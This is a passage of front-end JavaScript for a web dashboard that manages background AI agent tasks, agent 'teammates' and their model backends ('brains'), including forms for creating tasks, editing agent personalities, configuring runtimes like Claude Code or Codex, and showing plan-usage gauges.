        <label class="notice ${t.bypass ? "warn" : "info"}" style="cursor:pointer"><input type="checkbox" id="t-bypass" ${t.bypass ? "checked" : ""}><div><b>Bypass</b>: run tools without asking. ${t.bypass ? "⚠ On: shell commands and other actions run without your OK." : "Off: actions wait under \"Needs you\"."}</div></label>
        ${t.children.length ? `<div><h2 class="section">Delegated</h2><div class="card list">${t.children.map((c) => `<a class="list-item" href="/tasks/${c.id}"><span class="faint mono small">#${c.id}</span><span class="grow">${esc(c.title)}</span><span class="status ${c.status}">${c.status}</span></a>`).join("")}</div></div>` : ""}
        ${events.length ? `<div><h2 class="section">Steps <span class="count">${events.filter((e) => e.type === "tool_call").length}</span></h2>${stepsHtml(events, t.status === "running").replace("<details", "<details open")}</div>` : ""}
      </div>
      <div class="drawer-foot">
        ${t.session_id ? `<a class="btn ghost" href="/chat/${t.session_id}">${ICON.chat}Open conversation</a>` : ""}
        <span class="grow"></span>
        ${["queued", "running", "waiting"].includes(t.status) ? `<button class="btn" id="t-cancel">${t.status === "queued" ? "Cancel" : `${ICON.stop}Stop`}</button>` : ""}
        ${!["running", "waiting"].includes(t.status) ? `<button class="btn danger" id="t-del">${ICON.trash}Delete</button><button class="btn" id="t-retry">${ICON.refresh}Run again</button>` : ""}
      </div>`, { onClose: () => { state.openId = null; if (location.pathname !== "/tasks") history.replaceState(null, "", "/tasks"); } });
    const act = (sel, fn) => { const b = $(sel, d.el); if (b) b.onclick = async () => { try { await fn(); } catch (e) { fail(e); } }; };
    $("#t-bypass", d.el).onchange = async (e) => {
      const on = e.target.checked;
      if (on && !confirmBypass(`task #${t.id}`)) { e.target.checked = false; return; }
      try { await api(`/api/tasks/${id}`, { method: "PATCH", body: { bypass: on } }); d.close(); load(); showTask(id); } catch (err) { e.target.checked = !on; fail(err); }
    };
    act("#t-cancel", async () => { await api(`/api/tasks/${id}/cancel`, { method: "POST" }); d.close(); load(); });
    act("#t-del", async () => { if (!confirm("Delete this task?")) return; await api(`/api/tasks/${id}`, { method: "DELETE" }); d.close(); load(); });
    act("#t-retry", async () => { const r = await api(`/api/tasks/${id}/retry`, { method: "POST" }); toast(`Queued as #${r.id}`); d.close(); load(); });
    $$("a[href]", d.el).forEach((a) => a.addEventListener("click", () => $("#drawer-root").innerHTML = ""));
  }

  $("#new-job", root).onclick = () => jobDrawer(null);
  $("#new-task", root).onclick = () => {
    const d = openDrawer(`${drawerHead("New task", "Runs in the background. Write it so it stands alone: the agent sees nothing else.")}
      <form class="drawer-body" id="task-form">
        <label class="field">What should be done?<textarea class="input" name="prompt" rows="7" required placeholder="e.g. Research three options for … and recommend one, with sources."></textarea></label>
        <label class="field">Title <input class="input" name="title" placeholder="optional, defaults to the start of the prompt"></label>
        <div class="grid grid-2">
          <label class="field">Agent<select class="input" name="agent">${agentOptions("", { auto: true })}</select></label>
          <label class="field">Brain<select class="input" name="brain">${brainOptions("")}</select></label>
        </div>
        <label class="field"><span>Run at (optional)</span><input class="input" type="datetime-local" name="run_at"></label>
        <label class="row" style="gap:8px;cursor:pointer"><input type="checkbox" name="bypass"><span><b>Bypass</b>: run tools without asking (⚠ shell commands too)</span></label>
      </form>
      <div class="drawer-foot"><button class="btn" data-close>Cancel</button><button class="btn primary" id="t-create">${ICON.play}Queue task</button></div>`);
    $("textarea", d.el).focus();
    $("#t-create", d.el).onclick = async () => {
      const f = new FormData($("#task-form", d.el));
      if (f.get("bypass") && !confirmBypass("this task")) return;
      const runAt = f.get("run_at") ? new Date(f.get("run_at")).toISOString() : undefined; // with Z: the server reads it as UTC
      try {
        const { id } = await api("/api/tasks", { method: "POST", body: { prompt: f.get("prompt"), title: f.get("title"), agent: f.get("agent"), brain: f.get("brain"), run_at: runAt, bypass: !!f.get("bypass") } });
        d.close(); toast(`Queued task #${id}`); load();
      } catch (e) { fail(e); }
    };
  };

  await load();
  if (initialId) showTask(Number(initialId));
  const reload = debounce(() => { load(); if (state.openId && $("#drawer-root").children.length) showTask(state.openId); }, 700);
  return {
    update: (id) => { if (id) showTask(Number(id)); },
    onUi: (e) => ["tasks", "approvals"].includes(e.kind) && reload(),
    onAgent: (e) => e.taskId && reload(),
  };
}

// ── agents ───────────────────────────────────────────────────────────────
async function viewAgents(root) {
  await Promise.all([loadMeta(true), loadSpace(true)]);
  const draw = () => {
    root.innerHTML = `<div class="page">
      <div class="page-head"><div><h1>Team</h1><p>Your agents. Each one is a name, a personality and a brain. @mention them in any chat; they can bring each other in the same way.</p></div>
        <div class="actions"><button class="btn primary" id="new-agent">${ICON.plus}Add a teammate</button></div></div>
      <div class="team-grid">${meta.agents.map((a) => {
        const sp = team.byHandle[a.name], st = sp?.status ?? { state: "idle" };
        return `<article class="card mate" data-name="${esc(a.name)}">
          <div class="mate-top">${face(a.name, 58, st.state)}
            <div class="grow" style="min-width:0"><div class="mate-name">${esc(a.displayName)}${a.isDefault ? `<span class="lead-tag">answers first</span>` : ""}</div>
              <div class="small ${st.state === "working" ? "working-txt" : st.state === "away" ? "away-txt" : "faint"}">${st.state === "working" || st.state === "away" ? esc(st.detail) : `@${esc(a.name)}`}</div></div></div>
          <p class="mate-desc">${esc(a.description) || `<span class="faint">No personality written yet.</span>`}</p>
          <div class="mate-foot">
            <span class="small faint" title="The brain this teammate thinks with${a.fallback ? `, and its fallback` : ""}">${brainMark(a.brain, 18)} ${esc(brainLabel(a.brain))}${a.fallback ? ` <span class="faint">→ ${esc(brainLabel(a.fallback))}</span>` : ""}</span>
            <span class="grow"></span>
            <a class="btn sm" href="/chat/new?lead=${esc(a.name)}" data-stop>${ICON.chat}Chat</a>
          </div>
        </article>`;
      }).join("")}</div>
    </div>`;
    $$(".mate", root).forEach((c) => (c.onclick = (e) => { if (e.target.closest("[data-stop]")) return; edit(meta.agents.find((a) => a.name === c.dataset.name)); }));
    $("#new-agent", root).onclick = () => edit(null);
  };

  function edit(a) {
    const EMOJI = ["🧭", "🔎", "🛠️", "📬", "🧠", "📅", "💸", "🌦️", "✍️", "🎨", "📈", "🧾", "🏠", "⛵", "🤖", "🦉"];
    const brainOpts = meta.brains.map((b) => `<option value="${esc(b.name)}" ${(a?.brain ?? "claude-code") === b.name ? "selected" : ""}>${esc(b.label || b.name)}${b.local ? " (local)" : ""}</option>`).join("");
    const d = openDrawer(`${drawerHead(a ? `${face(a.name, 28)} ${esc(a.displayName)}` : "Add a teammate", a ? `@${esc(a.name)}` : "A name, a personality and a brain. That's all a teammate is.")}
      <div class="tabs drawer-tabs" id="ed-tabs">${["Teammate", "File"].map((x, i) => `<button type="button" data-tab="${i}" class="${i ? "" : "on"}">${x}</button>`).join("")}</div>
      <form class="drawer-body" id="ed">
        <section data-pane="0" class="stack">
          <div class="row" style="align-items:flex-end;gap:10px">
            <label class="field" style="width:84px">Avatar<input class="input emoji-in" name="emoji" value="${esc(a?.emoji ?? "🤖")}" maxlength="4"></label>
            <label class="field grow">Name ${a ? `<span class="small faint">@${esc(a.name)} (can't be changed)</span>` : `<span class="small faint">also their @handle</span>`}<input class="input" name="displayName" required value="${esc(a?.displayName ?? "")}" placeholder="e.g. Nora" ${a ? "readonly" : ""}></label>
          </div>
          <div class="chips">${EMOJI.map((x) => `<button type="button" class="chip outline emoji-pick" style="cursor:pointer;font-size:15px">${x}</button>`).join("")}</div>
          <div class="row" style="gap:10px;align-items:flex-end">
            <label class="field grow">Brain <span class="small faint">The model they think with</span><select class="input" name="brain">${brainOpts}</select></label>
            <label class="field grow">Fallback brain <span class="small faint">When the brain can't take a turn (limit, logged out, silent)</span><select class="input" name="fallback">
              <option value="">None: stop with an error (you can retry)</option>${meta.brains.map((b) => `<option value="${esc(b.name)}" ${a?.fallback === b.name ? "selected" : ""}>${esc(b.label || b.name)}${b.local ? " (local)" : ""}</option>`).join("")}</select></label>
          </div>
          <label class="field">Personality <span class="small faint">Who they are, what they're good at, how they talk. The first sentence is how the team sees them.</span>
            <textarea class="input" name="system" rows="14" placeholder="Nora is the team's travel planner: organised and cheerful. She finds routes, prices and places to stay, and puts it all in one clear plan.">${esc(a?.system ?? "")}</textarea></label>
        </section>
        <section data-pane="1" class="stack" hidden>
          ${a ? `<div class="small faint">config/agents/${esc(a.name)}.md: saving here replaces the form.</div><textarea class="input code-edit" id="ed-raw" spellcheck="false">${esc(a.raw)}</textarea>` : `<div class="small faint">Available once they're saved.</div>`}
        </section>
      </form>
      <div class="drawer-foot">${a && !a.isDefault ? `<button class="btn danger" id="ed-del">${ICON.trash}Remove</button>` : ""}<span class="grow"></span>
        <button class="btn" data-close>Cancel</button><button class="btn primary" id="ed-save">${a ? "Save" : "Add to team"}</button></div>`);
    let tab = 0;
    $$("#ed-tabs button", d.el).forEach((b) => (b.onclick = () => {
      tab = +b.dataset.tab;
      $$("#ed-tabs button", d.el).forEach((x) => x.classList.toggle("on", x === b));
      $$("[data-pane]", d.el).forEach((p) => (p.hidden = p.dataset.pane !== b.dataset.tab));
    }));
    $$(".emoji-pick", d.el).forEach((b) => (b.onclick = () => ($("[name=emoji]", d.el).value = b.textContent)));
    if ($("#ed-raw", d.el)) codeEditor($("#ed-raw", d.el));
    $("#ed-save", d.el).onclick = async () => {
      const f = new FormData($("#ed", d.el));
      const display = String(f.get("displayName") ?? "").trim();
      const handle = a?.name ?? display.toLowerCase().normalize("NFKD").replace(/[\u0300-\u036f]/g, "").replace(/æ/g, "ae").replace(/ø/g, "o").replace(/å/g, "a").replace(/[^a-z0-9_-]+/g, "");
      if (!handle) return toast("Give them a name", true);
      if (!a && meta.agents.some((x) => x.name === handle)) return toast(`There's already a @${handle}`, true);
      try {
        if (tab === 1 && a) await api(`/api/agents/${encodeURIComponent(handle)}`, { method: "PUT", body: { raw: $("#ed-raw", d.el).value } });
        else {
          // Name, avatar, brain, personality. Expert knobs a file already has (set by hand) are kept.
          const agent = {
            ...(a ? { maxSteps: a.maxSteps, maxMinutes: a.maxMinutes, autoApprove: a.autoApprove, privateAccess: a.privateAccess, workdir: a.workdir } : {}),
            displayName: display[0]?.toUpperCase() + display.slice(1).toLowerCase() === handle[0]?.toUpperCase() + handle.slice(1) ? undefined : display,
            emoji: f.get("emoji"), brain: f.get("brain"), fallback: f.get("fallback") || undefined, system: f.get("system"),
          };
          await api(`/api/agents/${encodeURIComponent(handle)}`, { method: "PUT", body: { agent } });
        }
        toast(a ? `Saved ${a.displayName}` : `${display} joined the team as @${handle}`);
        d.close(); await Promise.all([loadMeta(true), loadSpace(true)]); draw();
      } catch (e) { fail(e); }
    };
    const del = $("#ed-del", d.el);
    if (del) del.onclick = async () => {
      if (!confirm(`Remove ${a.displayName} from the team? Their conversations are kept.`)) return;
      try { await api(`/api/agents/${encodeURIComponent(a.name)}`, { method: "DELETE" }); d.close(); await Promise.all([loadMeta(true), loadSpace(true)]); draw(); } catch (e) { fail(e); }
    };
  }
  draw();
  const hash = location.hash.slice(1);
  if (hash === "new") edit(null);
  else if (hash && meta.agents.find((a) => a.name === hash)) edit(meta.agents.find((a) => a.name === hash));
  return { onUi: (e) => ["config", "run", "tasks", "brains"].includes(e.kind) && Promise.all([loadMeta(true), loadSpace(true)]).then(() => { if (!$("#drawer-root").children.length) draw(); }) };
}

// ── brains ───────────────────────────────────────────────────────────────
const BRAIN_HELP = {
  "claude-code": { desc: "Claude on a Claude subscription (no API key), through the Claude Code CLI. los translates it into the same protocol as an API brain: los runs the loop and every tool call, Claude has no tools of its own. Tool flags in args are refused.",
    presets: [["Effort: high", ["--effort", "high"]]],
    env: [["CLAUDE_CODE_OAUTH_TOKEN", "from `claude setup-token`, instead of logging in (can't read usage)"], ["ANTHROPIC_BASE_URL", "point Claude Code at another endpoint"], ["ANTHROPIC_API_KEY", "use API billing instead of a subscription"]],
    model: "opus, sonnet, haiku or a full model id" },
  codex: { desc: "OpenAI's Codex CLI. Logs in with ChatGPT (device code) or an API key.",
    presets: [["Full access (in container)", ["-s", "danger-full-access"]], ["Read-only", ["-s", "read-only"]]],
    env: [["OPENAI_API_KEY", "use an API key instead of a ChatGPT login"]], model: "e.g. gpt-5-codex" },
  opencode: { desc: "opencode CLI: any provider (Anthropic, OpenAI, OpenRouter, …) via API keys, plus free models.",
    presets: [["Auto-approve tools", ["--auto"]]],
    env: [["ANTHROPIC_API_KEY", ""], ["OPENAI_API_KEY", ""], ["OPENROUTER_API_KEY", ""]], model: "provider/model, e.g. opencode/big-pickle" },
  cli: { desc: "Any command. {prompt} in the args is replaced with the prompt (otherwise it goes to stdin), and stdout is the answer.",
    presets: [], env: [], model: "" },
  anthropic: { desc: "Anthropic Messages API with an API key. Uses los's own tool loop.", presets: [], env: [["ANTHROPIC_API_KEY", ""]], model: "e.g. claude-sonnet-5-5" },
  openai: { desc: "Any OpenAI-compatible API: Ollama, vLLM, LM Studio, OpenRouter, OpenAI. Uses los's own tool loop.", presets: [], env: [["OPENAI_API_KEY", ""]], model: "e.g. qwen3:14b" },
};
const TYPE_GLYPH = { "claude-code": "C", codex: "X", opencode: "O", cli: "$", anthropic: "A", openai: "AI" };
const TYPE_COLOR = { "claude-code": "#d97757", codex: "#2b2b2b", opencode: "#3a6fb0", cli: "#5c6b2f", anthropic: "#b05a3c", openai: "#10a37f" };

function until(ts) {
  const d = toDate(ts);
  if (!d) return "";
  const s = (d - Date.now()) / 1000;
  if (s <= 0) return "resetting now";
  if (s < 3600) return `resets in ${Math.round(s / 60)}m`;
  if (s < 86400) return `resets in ${Math.floor(s / 3600)}h ${Math.round((s % 3600) / 60)}m`;
  return `resets ${d.toLocaleDateString(undefined, { weekday: "short" })} ${d.toLocaleTimeString(undefined, { hour: "2-digit", minute: "2-digit" })}`;
}
const fmtTokens = (n) => (n >= 1e6 ? `${(n / 1e6).toFixed(1)}M` : n >= 1e3 ? `${Math.round(n / 1e3)}k` : String(n ?? 0));

async function viewBrains(root) {
  let data;
  const live = {}; // name → { status, limits, login }
  async function load() {
    data = await api("/api/brains");
    draw();
    for (const b of data.brains) refreshOne(b.name);
  }
  async function refreshOne(name, force = false) {
    try { live[name] = await api(`/api/brains/${encodeURIComponent(name)}/status${force ? "?force=1" : ""}`); }
    catch (e) { live[name] = { status: { ok: false, state: "unknown", detail: e.message } }; }
    const card = $(`[data-brain="${CSS.escape(name)}"]`, root);
    if (card) card.replaceWith(h(cardHtml(data.brains.find((b) => b.name === name))));
    wire();
  }
  function statusChip(b) {
    const st = live[b.name]?.status ?? b.status;
    if (!st) return `<span class="chip"><span class="spinner" style="width:10px;height:10px"></span>checking</span>`;
    if (st.ok) return `<span class="chip ok">● ${esc(st.state === "ok" ? (b.canLogin ? "logged in" : "ready") : st.state)}</span>`;
    if (st.state === "logged-out") return b.usedBy.length ? `<span class="chip err">● logged out</span>` : `<span class="chip warn">● not logged in</span>`;
    return `<span class="chip warn">● ${esc(st.state === "missing" ? "not available" : st.state)}</span>`;
  }
  // Plan limits as big, readable gauges: the percentage is the headline, colour says how worried to be.
  function limitsHtml(b) {
    const lim = live[b.name]?.limits;
    if (!b.hasLimits) return "";
    if (!lim) return `<div class="small faint">Loading plan usage…</div>`;
    const rows = lim.windows.map((w) => {
      const pct = Math.max(0, Math.min(100, w.percent ?? 0));
      const tone = pct >= 90 ? "err" : pct >= 70 ? "warn" : "ok";
      const left = w.percent == null ? "" : pct >= 100 ? "limit reached" : `${Math.round(100 - pct)}% left`;
      return `<div class="gauge ${tone}">
        <div class="gauge-top"><span class="gauge-label">${esc(w.label)}</span><b class="gauge-pct">${w.percent == null ? "—" : Math.round(pct) + "%"}</b></div>
        <div class="gauge-bar"><span style="width:${Math.max(pct, 1)}%"></span></div>
        <div class="gauge-foot"><span>${esc(left)}</span><span>${esc(until(w.resetsAt))}</span></div></div>`;
    }).join("");
    return `<div class="gauges">${rows}</div>${lim.note ? `<div class="small faint">${esc(lim.note)}</div>` : ""}`;
  }
  // Use through los: three numbers, then tokens per day for two weeks (hover a day for details).
  function statsHtml(b) {
    const s = data.stats[b.name];
    if (!s) return `<div class="small faint">Not used through los yet.</div>`;
    const days = [...Array(14)].map((_, i) => new Date(Date.now() - (13 - i) * 864e5).toISOString().slice(0, 10));
    const per = Object.fromEntries(s.daily.map((d) => [d.day, d]));
    const max = Math.max(1, ...s.daily.map((d) => d.tokens ?? 0));
    const label = (d) => new Date(d + "T12:00:00Z").toLocaleDateString(undefined, { day: "numeric", month: "short" });
    return `<div class="brain-stats">
        <div><b>${s.runs_24h ?? 0}</b><span>runs, last 24 h</span></div>
        <div><b>${fmtTokens(s.tokens_24h ?? 0)}</b><span>tokens, last 24 h</span></div>
        <div><b>${s.cost_7d ? "$" + s.cost_7d.toFixed(2) : "—"}</b><span title="What it would cost on the API">API value, 7 days</span></div>
      </div>
      <div class="use-chart" role="img" aria-label="Tokens per day, last 14 days">
        ${days.map((d, i) => { const x = per[d], t = x?.tokens ?? 0;
          return `<span class="${i === 13 ? "today" : ""} ${t ? "" : "zero"}" style="--h:${t ? Math.max(6, (t / max) * 100) : 0}%" data-tip="${esc(label(d))} · ${fmtTokens(t)} tokens · ${x?.runs ?? 0} runs"></span>`; }).join("")}
      </div>
      <div class="use-axis"><span>${esc(label(days[0]))}</span><span>tokens per day</span><span>today</span></div>
      <div class="small faint">${s.runs} runs in total · ${fmtTokens((s.input ?? 0) + (s.output ?? 0))} tokens · last used ${ago(s.last_at)}</div>`;
  }
  function cardHtml(b) {
    const st = live[b.name]?.status ?? b.status;
    // Red only when an agent depends on it; an unused brain that isn't logged in yet just offers the button.
    const loggedOut = st && !st.ok && st.state === "logged-out";
    const down = loggedOut && b.usedBy.length > 0;
    const who = st?.account ? `${esc(st.account)}${st.plan ? ` · ${esc(st.plan)}` : ""}` : esc(st?.detail ?? "");
    return `<article class="card brain-card ${down ? "down" : ""}" data-brain="${esc(b.name)}">
      <div class="brain-head">
        <span class="avatar" style="background:${TYPE_COLOR[b.type] ?? "#555"};font-size:${(TYPE_GLYPH[b.type] ?? "?").length > 1 ? 12 : 15}px">${esc(TYPE_GLYPH[b.type] ?? "?")}</span>
        <div class="grow"><div class="name">${esc(b.label || b.name)}${b.label ? ` <span class="faint mono small">${esc(b.name)}</span>` : ""}</div>
          <div class="small muted">${esc(b.typeLabel)}${b.model ? ` · <span class="mono">${esc(b.model)}</span>` : ""}${b.local ? " · 🔒 local" : ""}</div></div>
        ${statusChip(b)}
      </div>
      ${down ? `<div class="notice" style="background:var(--err-soft)"><span>⚠</span><div><b>Logged out.</b> ${esc(st.detail)}${b.canLogin ? " Log in again to keep using this brain." : ""}</div></div>` : ""}
      <dl class="kv">
        ${b.runtime && b.type !== "cli" ? `<dt>Account</dt><dd>${who || "—"}<div class="small faint">${b.hostLogin ? "shared with the server's own Claude Code" : `own login · <span class="mono">${esc(b.accountDir ?? "")}</span>`}</div></dd>` : st?.detail ? `<dt>Status</dt><dd>${esc(st.detail)}</dd>` : ""}
        ${b.base_url ? `<dt>URL</dt><dd class="mono small">${esc(b.base_url)}</dd>` : ""}
        ${b.command ? `<dt>Command</dt><dd class="mono small">${esc([b.command, ...(b.args ?? [])].join(" "))}</dd>` : b.args?.length ? `<dt>Args</dt><dd class="mono small">${esc(b.args.join(" "))}</dd>` : ""}
        ${b.envKeys.length ? `<dt>Env</dt><dd><div class="chips">${b.envKeys.map((e) => `<span class="chip mono" title="${esc(e.hint)}">${esc(e.key)}</span>`).join("")}</div></dd>` : ""}
        <dt>Used by</dt><dd>${b.usedBy.length ? b.usedBy.map((a) => `<span class="chip">${esc(a)}</span>`).join(" ") : `<span class="faint">no agent</span>`}</dd>
      </dl>
      ${b.hasLimits ? `<div class="brain-section"><h4>Plan usage</h4>${limitsHtml(b)}</div>` : ""}
      <div class="brain-section"><h4>Through los</h4>${statsHtml(b)}</div>
      <div class="brain-actions">
        ${b.canLogin ? `<button class="btn sm ${loggedOut ? "primary" : ""}" data-act="login">${loggedOut ? "Log in" : "Log in again"}</button>` : ""}
        <button class="btn sm" data-act="test">${ICON.play}Test</button>
        <button class="btn sm ghost" data-act="refresh" title="Re-check login and usage">${ICON.refresh}</button>
        <span class="grow"></span>
        <button class="btn sm ghost" data-act="edit">${ICON.edit}Edit</button>
      </div>
    </article>`;
  }
  function draw() {
    const down = data.brains.filter((b) => b.usedBy.length && (live[b.name]?.status ?? b.status)?.state === "logged-out");
    root.innerHTML = `<div class="page">
      <div class="page-head"><div><h1>Brains</h1><p>Every model and agent runtime los can think with. Runtimes (Claude Code, Codex, opencode) bring their own tools and log in with your accounts, so you can run several accounts side by side. Each teammate thinks with one, and can have a fallback brain for when it can't take a turn (both on the Team page).</p></div>
        <div class="actions"><button class="btn primary" id="add">${ICON.plus}Add brain</button></div></div>
      ${down.length ? `<div class="notice" style="margin-bottom:14px;background:var(--err-soft)"><span>⚠</span><div><b>${down.map((b) => esc(b.label || b.name)).join(", ")}</b> ${down.length === 1 ? "is" : "are"} logged out. Agents using ${down.length === 1 ? "it" : "them"} will fail until you log in again.</div></div>` : ""}
      <div class="grid brain-grid" id="cards">${data.brains.map(cardHtml).join("")}</div>
    </div>`;
    $("#add", root).onclick = () => editBrain(null);
    wire();
  }
  function wire() {
    $$(".brain-card", root).forEach((card) => {
      const name = card.dataset.brain;
      const b = data.brains.find((x) => x.name === name);
      $$("[data-act]", card).forEach((btn) => (btn.onclick = async () => {
        const act = btn.dataset.act;
        if (act === "edit") return editBrain(b);
        if (act === "login") return loginFlow(b, () => refreshOne(name, true));
        if (act === "refresh") { btn.disabled = true; await refreshOne(name, true); return; }
        if (act === "test") {
          btn.disabled = true; btn.innerHTML = `<span class="spinner"></span>Testing`;
          try { const r = await api(`/api/brains/${encodeURIComponent(name)}/test`, { method: "POST" }); toast(`${name} replied "${r.reply}" in ${(r.ms / 1000).toFixed(1)}s`); }
          catch (e) { fail(e); } finally { refreshOne(name, true); }
        }
      }));
    });
  }

  function editBrain(b) {
    const isNew = !b;
    const st = { type: b?.type ?? "claude-code" };
    const envRows = (b?.envKeys ?? []).map((e) => ({ key: e.key, hint: e.hint, value: "", existing: true }));
    const removed = new Set();
    const d = openDrawer(`${drawerHead(isNew ? "Add brain" : `Edit ${esc(b.label || b.name)}`, isNew ? "A brain is one model or runtime with its own settings and login." : `<span class="mono">${esc(b.name)}</span> · ${esc(b.typeLabel)}`)}
      <form class="drawer-body" id="bf" autocomplete="off">
        <div class="grid grid-2">
          ${isNew ? `<label class="field">Name (id)<input class="input mono" name="name" required pattern="[a-z0-9][a-z0-9_-]*" placeholder="e.g. claude-work"></label>` : ""}
          <label class="field">Display name<input class="input" name="label" value="${esc(b?.label ?? "")}" placeholder="e.g. Claude · work account"></label>
        </div>
        <div class="field">Type<div class="type-picker">${Object.entries(data.types).map(([k, t]) => `
          <label class="type-opt"><input type="radio" name="type" value="${k}" ${k === st.type ? "checked" : ""}>
            <span class="avatar" style="background:${TYPE_COLOR[k]};width:26px;height:26px;font-size:${TYPE_GLYPH[k].length > 1 ? 10 : 12}px">${TYPE_GLYPH[k]}</span><span>${esc(t.label)}</span></label>`).join("")}</div></div>
        <div class="small muted" id="type-desc"></div>
        <div id="type-fields" class="stack"></div>
        <div class="field"><span>Environment variables <span class="faint">(stored in data/brain-env.json, never in settings.yaml)</span></span>
          <div id="env-rows" class="stack" style="gap:6px"></div>
          <div class="row" style="flex-wrap:wrap"><button type="button" class="btn sm" id="env-add">${ICON.plus}Add variable</button><span id="env-suggest" class="chips"></span></div>
        </div>
      </form>
      <div class="drawer-foot">${!isNew ? `<button class="btn danger" id="b-del">${ICON.trash}Delete</button>` : ""}<span class="grow"></span>
        <button class="btn" data-close>Cancel</button><button class="btn primary" id="b-save">${isNew ? "Add brain" : "Save"}</button></div>`);
    const form = $("#bf", d.el);
    const val = (n) => form.elements[n]?.value ?? "";

    function typeFields() {
      const t = st.type, help = BRAIN_HELP[t];
      $("#type-desc", d.el).textContent = help.desc;
      const args = (b?.type === t ? b.args : null) ?? (isNew && help.presets[0] ? help.presets[0][1] : []);
      const sep = t === "claude-code";
      const hasAccount = isNew ? false : !!b?.account;
      $("#type-fields", d.el).innerHTML = `
        ${t === "claude-code" ? `<div class="field"><span>Login</span>
          <label class="remember"><input type="radio" name="acct" value="host" ${!hasAccount ? "checked" : ""}> The server's own Claude login (shared with Claude Code on the host)</label>
          <label class="remember"><input type="radio" name="acct" value="own" ${hasAccount ? "checked" : ""}> Its own account: log in separately, e.g. your second Claude account</label></div>` : ""}
        ${["codex", "opencode"].includes(t) ? `<div class="small faint">Gets its own login and state folder under <code>data/accounts/</code>.</div>` : ""}
        ${t === "openai" ? `<label class="field">Base URL<input class="input mono" name="base_url" value="${esc(b?.base_url ?? "")}" placeholder="http://host:11434/v1"></label>` : ""}
        ${t === "cli" ? `<label class="field">Command<input class="input mono" name="command" value="${esc(b?.command ?? "")}" placeholder="e.g. llm"></label>` : ""}
        ${t !== "cli" ? `<label class="field"><span>Model <span class="faint">(optional for runtimes)</span></span><input class="input mono" name="model" value="${esc(b?.model ?? "")}" placeholder="${esc(help.model)}"></label>` : ""}
        ${["anthropic", "openai"].includes(t) ? `<label class="field">API key variable<input class="input mono" name="api_key_env" value="${esc(b?.api_key_env ?? (t === "anthropic" ? "ANTHROPIC_API_KEY" : ""))}" placeholder="OPENAI_API_KEY (empty = no key)"></label>` : ""}
        ${t === "openai" ? `<label class="remember"><input type="checkbox" name="local" ${b?.local ? "checked" : ""}> Runs on my own hardware (may see local-only tools: mail, memory, documents)</label>` : ""}
        ${help.runtime !== false && ["claude-code", "codex", "opencode", "cli"].includes(t) ? `<label class="field"><span>Arguments <span class="faint">one per line${t === "cli" ? ", {prompt} = the prompt" : ""}</span></span>
          <textarea class="input code-edit" name="args" style="min-height:90px" spellcheck="false">${esc(args.join("\n"))}</textarea></label>
          ${help.presets.length ? `<div class="chips">${help.presets.map(([l], i) => `<button type="button" class="chip outline" data-preset="${i}" style="cursor:pointer">${esc(l)}</button>`).join("")}</div>` : ""}` : ""}`;
      $$("[data-preset]", d.el).forEach((p) => (p.onclick = () => { form.elements.args.value = help.presets[p.dataset.preset][1].join("\n"); }));
      $("#env-suggest", d.el).innerHTML = help.env.map(([k, why]) => `<button type="button" class="chip outline" data-env="${k}" title="${esc(why)}" style="cursor:pointer">+ ${k}</button>`).join("");
      $$("[data-env]", d.el).forEach((x) => (x.onclick = () => { if (!envRows.some((r) => r.key === x.dataset.env)) { envRows.push({ key: x.dataset.env, value: "" }); drawEnv(); } }));
    }
    function drawEnv() {
      $("#env-rows", d.el).innerHTML = envRows.map((r, i) => `<div class="row env-row">
        <input class="input mono" data-k="${i}" value="${esc(r.key)}" placeholder="NAME" ${r.existing ? "readonly" : ""} style="max-width:42%">
        <input class="input mono grow" data-v="${i}" type="password" autocomplete="new-password" value="${esc(r.value)}" placeholder="${r.existing ? `unchanged (${esc(r.hint)})` : "value"}">
        <button type="button" class="icon-btn" data-rm="${i}" title="Remove">${ICON.trash}</button></div>`).join("") || `<div class="small faint">None.</div>`;
      $$("[data-k]", d.el).forEach((x) => (x.oninput = () => (envRows[x.dataset.k].key = x.value.trim())));
      $$("[data-v]", d.el).forEach((x) => (x.oninput = () => (envRows[x.dataset.v].value = x.value)));
      $$("[data-rm]", d.el).forEach((x) => (x.onclick = () => { const r = envRows.splice(Number(x.dataset.rm), 1)[0]; if (r.existing) removed.add(r.key); drawEnv(); }));
    }
    $$("input[name=type]", d.el).forEach((r) => (r.onchange = () => { st.type = r.value; typeFields(); }));
    $("#env-add", d.el).onclick = () => { envRows.push({ key: "", value: "" }); drawEnv(); };
    typeFields(); drawEnv();

    $("#b-save", d.el).onclick = async () => {
      const name = isNew ? val("name").trim() : b.name;
      if (!name) return toast("Give the brain a name", true);
      const t = st.type;
      const config = {
        type: t, label: val("label"), model: val("model"), base_url: val("base_url"), command: val("command"),
        api_key_env: val("api_key_env"), local: !!form.elements.local?.checked,
        args: (form.elements.args?.value ?? "").split("\n").map((x) => x.trim()).filter(Boolean),
        account: t === "claude-code" ? (form.querySelector("input[name=acct]:checked")?.value === "own" ? (b?.account || name) : "") : (b?.account ?? ""),
      };
      const env = {};
      for (const k of removed) env[k] = null;
      for (const r of envRows) if (r.key && (r.value || !r.existing)) env[r.key] = r.value;
      try {
        await api(isNew ? "/api/brains" : `/api/brains/${encodeURIComponent(name)}`, { method: isNew ? "POST" : "PUT", body: { name, config, env } });
        toast(isNew ? `Added ${name}` : `Saved ${name}`);
        d.close(); delete live[name]; await loadMeta(true); await load();
        const nb = data.brains.find((x) => x.name === name);
        if (isNew && nb?.canLogin && !nb.hostLogin) loginFlow(nb, () => refreshOne(name, true));
      } catch (e) { fail(e); }
    };
    const del = $("#b-del", d.el);
    if (del) del.onclick = async () => {
      if (!confirm(`Delete brain "${b.name}"? Its login folder stays on disk.`)) return;
      try { await api(`/api/brains/${encodeURIComponent(b.name)}`, { method: "DELETE" }); d.close(); await loadMeta(true); await load(); } catch (e) { fail(e); }
    };
  }

  await load();
  return {
    onUi: (e) => {
      if (e.kind === "config" || e.kind === "brains") load();
      if (e.kind === "brain-auth" && e.brain) refreshOne(e.brain, true);
    },
  };
}

// Log a runtime in from the browser: Claude shows a URL and wants the code back, Codex shows a device code.
async function loginFlow(b, onDone) {
  const d = openDrawer(`${drawerHead(`Log in · ${esc(b.label || b.name)}`, esc(b.typeLabel))}
    <div class="drawer-body" id="lb"><div class="working"><span class="spinner"></span>Starting ${esc(b.typeLabel)} login…</div></div>
    <div class="drawer-foot"><button class="btn" data-close>Close</button></div>`, { onClose: () => { clearInterval(poll); if (!finished) api(`/api/brains/${encodeURIComponent(b.name)}/login`, { method: "DELETE" }).catch(() => {}); } });
  let finished = false, poll = null, codeSent = false;
  const body = $("#lb", d.el);
  const render = (l) => {
    if (!l) return;
    if (l.state === "done") {
